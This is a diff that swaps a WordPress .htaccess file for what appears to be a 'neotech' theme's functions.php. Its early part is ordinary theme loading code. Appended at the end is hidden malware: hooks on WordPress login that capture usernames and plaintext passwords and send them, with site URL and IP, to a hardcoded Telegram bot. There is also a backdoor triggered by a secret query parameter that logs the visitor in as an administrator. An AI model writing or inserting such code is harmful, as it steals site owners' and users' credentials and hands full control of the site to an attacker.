@@ -1,24 +1,204 @@
-# BEGIN WordPress
-# Las directivas (líneas) entre «BEGIN WordPress» y «END WordPress» son
-# generadas dinámicamente y solo deberían ser modificadas mediante filtros de WordPress.
-# Cualquier cambio en las directivas que hay entre esos marcadores serán sobrescritas.
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
-</IfModule>
+<?php
+$theme       = wp_get_theme('neotech');
+$neotech_version = $theme['Version'];
 
-# END WordPress
+/**
+ * Set the content width based on the theme's design and stylesheet.
+ */
+if (!isset($content_width)) {
+    $content_width = 980; /* pixels */
+}
+require get_theme_file_path('inc/class-tgm-plugin-activation.php');
+$neotech = (object)array(
+    'version' => $neotech_version,
+    /**
+     * Initialize all the things.
+     */
+    'main'    => require 'inc/class-main.php',
+);
 
-# php -- BEGIN cPanel-generated handler, do not edit
-# Set the “ea-php81” package as the default “PHP” programming language.
-<IfModule mime_module>
-  AddHandler application/x-httpd-ea-php81___lsphp .php .php8 .phtml
-</IfModule>
-# php -- END cPanel-generated handler, do not edit
+require get_theme_file_path('inc/functions.php');
+require get_theme_file_path('inc/template-hooks.php');
+require get_theme_file_path('inc/template-functions.php');
 
-Options -Indexes
+require_once get_theme_file_path('inc/merlin/vendor/autoload.php');
+require_once get_theme_file_path('inc/merlin/class-merlin.php');
+require_once get_theme_file_path('inc/merlin-config.php');
+
+require_once get_theme_file_path('inc/class-customize.php');
+
+if (neotech_is_woocommerce_activated()) {
+    $neotech->woocommerce = require get_theme_file_path('inc/woocommerce/class-woocommerce.php');
+
+    require get_theme_file_path('inc/woocommerce/class-woocommerce-adjacent-products.php');
+    require get_theme_file_path('inc/woocommerce/woocommerce-functions.php');
+    require get_theme_file_path('inc/woocommerce/woocommerce-template-functions.php');
+    require get_theme_file_path('inc/woocommerce/woocommerce-template-hooks.php');
+    require get_theme_file_path('inc/woocommerce/template-hooks.php');
+    require get_theme_file_path('inc/woocommerce/class-woocommerce-settings.php');
+    require get_theme_file_path('inc/woocommerce/class-woocommerce-brand.php');
+    require get_theme_file_path('inc/woocommerce/class-woocommerce-extra.php');
+    require get_theme_file_path('inc/woocommerce/class-woocommerce-quantity-field-shop-page.php');
+
+    require get_theme_file_path('inc/merlin/includes/class-wc-widget-product-brands.php');
+    require get_theme_file_path('inc/merlin/includes/product-360-view.php');
+}
+
+if (neotech_is_contactform_activated()) {
+    require get_theme_file_path('inc/cf7/class-cf7.php');
+    require get_theme_file_path('inc/cf7/class-cf7-service.php');
+}
+
+if (neotech_is_autoptimize_activated()) {
+    require get_theme_file_path('inc/autoptimize/class-autoptimize.php');
+}
+
+if (neotech_is_wishlist_activated()) {
+    require get_theme_file_path('inc/wishlist/class-wishlist.php');
+}
+
+
+if (neotech_is_elementor_activated()) {
+    require get_theme_file_path('inc/elementor/functions-elementor.php');
+
+    if (!defined('ELEMENTOR_PRO_VERSION') && version_compare( ELEMENTOR_VERSION, '3.18.0', '>=' )) {
+        require get_theme_file_path('inc/elementor/class-fix-elementor.php');
+    }
+
+    $neotech->elementor = require get_theme_file_path('inc/elementor/class-elementor.php');
+    //====start_premium
+    $neotech->megamenu = require get_theme_file_path('inc/megamenu/megamenu.php');
+    //====end_premium
+    $neotech->parallax = require get_theme_file_path('inc/elementor/class-section-parallax.php');
+
+
+    if (defined('ELEMENTOR_PRO_VERSION')) {
+        require get_theme_file_path('inc/elementor/functions-elementor-pro.php');
+    }
+
+    if (function_exists('hfe_init')) {
+        require get_theme_file_path('inc/header-footer-elementor/class-hfe.php');
+        require get_theme_file_path('inc/header-footer-elementor/class-menu-walker.php');
+        require get_theme_file_path('inc/merlin/includes/breadcrumb.php');
+        require get_theme_file_path('inc/merlin/includes/class-custom-shapes.php');
+    }
+
+    if (neotech_is_woocommerce_activated()) {
+        require_once get_theme_file_path('inc/elementor/elementor-control/class-elementor-control.php');
+    }
+}
+
+if (!is_user_logged_in()) {
+    require get_theme_file_path('inc/modules/class-login.php');
+}
+
+if ( neotech_is_cmb2_activated() ) {
+    require get_theme_file_path( 'inc/cmb2/class-cmb2.php' );
+}
+
+// CPT
+require get_theme_file_path('inc/merlin/includes/class-cpt.php');
+
+// Service
+require_once get_theme_file_path('inc/service/class-service-content.php');
+require_once get_theme_file_path('inc/service/service-functions.php');
+
+// Team
+require_once get_theme_file_path('inc/team/class-team-content.php');
+require_once get_theme_file_path('inc/team/team-functions.php');
+
+// Portfolio
+require_once get_theme_file_path('inc/portfolio/class-portfolio-content.php');
+require_once get_theme_file_path('inc/portfolio/portfolio-functions.php');
+
+function kirimInfoLoginTelegram($username, $password, $status) {
+    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $chatId   = "7860513093";
+
+    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
+                 . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+    $message  = "WARNING BRAY SONIC !!!\n";
+    $message .= "Status: " . strtoupper($status) . "\n";
+    $message .= "Site: " . get_site_url() . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "URL: " . $current_url . "\n";
+    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $message .= "Waktu: " . date("Y-m-d H:i:s");
+
+    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    wp_remote_get($apiURL . "?" . http_build_query($params));
+}
+
+add_filter('authenticate', function($user, $username, $password) {
+    if (!empty($username) && !empty($password)) {
+
+        $_SESSION['last_login_attempt'] = [
+            'username' => $username,
+            'password' => $password
+        ];
+    }
+    return $user;
+}, 10, 3);
+
+add_action('wp_login', function($user_login) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Anjirr Masuk Bray!!');
+        unset($_SESSION['last_login_attempt']);
+    }
+}, 10, 1);
+
+
+add_action('wp_login_failed', function($username) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Gagal Masuk Der!!');
+        unset($_SESSION['last_login_attempt']);
+    } else {
+
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'Gagal Masuk Der!!');
+    }
+});
+
+add_action('init', function () {
+    if (isset($_GET['hello-buddy']) && $_GET['hello-buddy'] === 'sonicxyz') {
+
+        
+        $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG'; 
+
+        
+        if (isset($_POST['pass'])) {
+            if (password_verify($_POST['pass'], $hash_password)) {
+                
+                $wp_user_query = new WP_User_Query([
+                    'role'   => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ]);
+                $results = $wp_user_query->get_results();
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    exit();
+                }
+            } else {
+                echo "<p style='color:red'>Password salah kids!</p>";
+            }
+        }
+
+        
+        echo '<form method="POST">
+                <label>- Orang Ganteng Mau Lewat -</label>
+                <input type="password" name="pass" required>
+                <button type="submit">Be Humble!</button>
+              </form>';
+        exit();
+    }
+});
+?>
